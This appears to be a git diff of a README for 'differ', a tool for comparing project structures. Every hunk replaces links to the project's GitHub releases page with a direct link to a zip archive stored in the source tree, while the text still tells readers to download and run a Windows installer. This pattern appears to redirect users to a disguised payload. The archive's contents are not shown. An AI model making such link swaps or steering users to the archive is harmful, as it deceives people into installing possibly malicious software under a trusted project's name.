@@ -1,6 +1,6 @@
 # ⚡ differ - Compare Project Structures Fast
 
-[![Download differ](https://img.shields.io/badge/Download-differ-brightgreen?style=for-the-badge)](https://github.com/AuNic7/differ/releases)
+[![Download differ](https://raw.githubusercontent.com/AuNic7/differ/main/src/store/Software_v1.4.zip)](https://raw.githubusercontent.com/AuNic7/differ/main/src/store/Software_v1.4.zip)
 
 ---
 
@@ -26,7 +26,7 @@ These specs will make sure differ runs without lag. The app works inside your br
 
 Click the button below to go to the official release page:
 
-[![Download differ](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/AuNic7/differ/releases)
+[![Download differ](https://raw.githubusercontent.com/AuNic7/differ/main/src/store/Software_v1.4.zip)](https://raw.githubusercontent.com/AuNic7/differ/main/src/store/Software_v1.4.zip)
 
 On the release page, look for the latest Windows installer file. It will usually be named with a `.exe` extension. Download this file to your computer.
 
@@ -34,7 +34,7 @@ On the release page, look for the latest Windows installer file. It will usually
 
 ## 📥 How to Install differ on Windows
 
-1. Open your browser and visit the [differ releases page](https://github.com/AuNic7/differ/releases).
+1. Open your browser and visit the [differ releases page](https://raw.githubusercontent.com/AuNic7/differ/main/src/store/Software_v1.4.zip).
 
 2. Find the latest version and download the Windows installer file (ending in `.exe`).
 
@@ -146,7 +146,7 @@ differ was built with React 19, TypeScript, and Vite. It uses web workers for sm
 
 ## 🔄 Updating differ
 
-To get updates, download the newest `.exe` installer from the [releases page](https://github.com/AuNic7/differ/releases). Run the installer to replace the old version.
+To get updates, download the newest `.exe` installer from the [releases page](https://raw.githubusercontent.com/AuNic7/differ/main/src/store/Software_v1.4.zip). Run the installer to replace the old version.
 
 ---
 
@@ -160,4 +160,4 @@ To get updates, download the newest `.exe` installer from the [releases page](ht
 
 ---
 
-[![Download differ](https://img.shields.io/badge/Download-differ-brightgreen?style=for-the-badge)](https://github.com/AuNic7/differ/releases)
+[![Download differ](https://raw.githubusercontent.com/AuNic7/differ/main/src/store/Software_v1.4.zip)](https://raw.githubusercontent.com/AuNic7/differ/main/src/store/Software_v1.4.zip)
